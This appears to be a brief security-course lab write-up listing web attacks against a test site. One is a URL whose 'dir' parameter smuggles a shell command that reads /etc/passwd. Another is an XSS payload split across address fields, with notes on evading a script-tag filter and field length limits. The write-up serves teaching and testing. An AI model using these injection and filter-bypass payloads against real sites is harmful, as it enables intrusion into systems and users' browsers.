* Attacks carried out using FireFox 11.0

A)
  The Attack)
    http://<IP>/cgi-bin/web-ls.cgi?dir=html%20%3E%20%2Fdev%2Fnull%3Bcat%20%2Fetc%2Fpasswd
  
  The Fix)

B) 
    Name: <script type="text/javascript">/*
    Street 1: */alert/*
    Street 2: */("Javascript successfully injected!");/*
    City: */</script >
    State:
    Zip Code:

    * The text "<script>" and "</script>" are removed server-side to protect against a XSS attack;
      we instead use "<script type="text/javascript>" and "</script >".
    * There is a 45 character limit per field client side; we separated the attack across multiple
      fields.
    * Fields have "<br>" tags inserted between them on the confirmation page; we used javascript
      comments so the javascript engine would ignore them.
    
    * The entire attack was carried out without viewing any of the server side code.
    * We viewed source on the client side only.

C)
  The Attack) service-attack.html and steal.cgi are included.
